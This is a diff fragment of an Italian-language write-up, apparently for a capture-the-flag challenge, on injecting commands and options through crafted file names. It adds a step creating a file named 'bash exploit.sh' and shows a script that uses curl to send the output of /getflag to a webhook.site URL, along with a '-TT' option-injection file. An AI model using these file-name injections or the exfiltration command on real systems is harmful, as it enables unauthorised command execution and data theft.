@@ -40,6 +40,10 @@ L'idea è creare alcuni file con nomi particolari e uno script di exploit che in
   ```bash
   touch -- '-TT'
   ```
+- **Comando che esegue `exploit.sh` :**
+  ```bash
+  touch 'bash exploit.sh'
+  ```
 - **Script di exploit:** Creare un file chiamato `bash exploit.sh` (il nome include anche spazi) contenente il comando per eseguire la richiesta al webhook. Ad esempio, in `exploit.sh` inserire:
   ```bash
   curl "https://webhook.site/your_webhook_id?$(/getflag)"
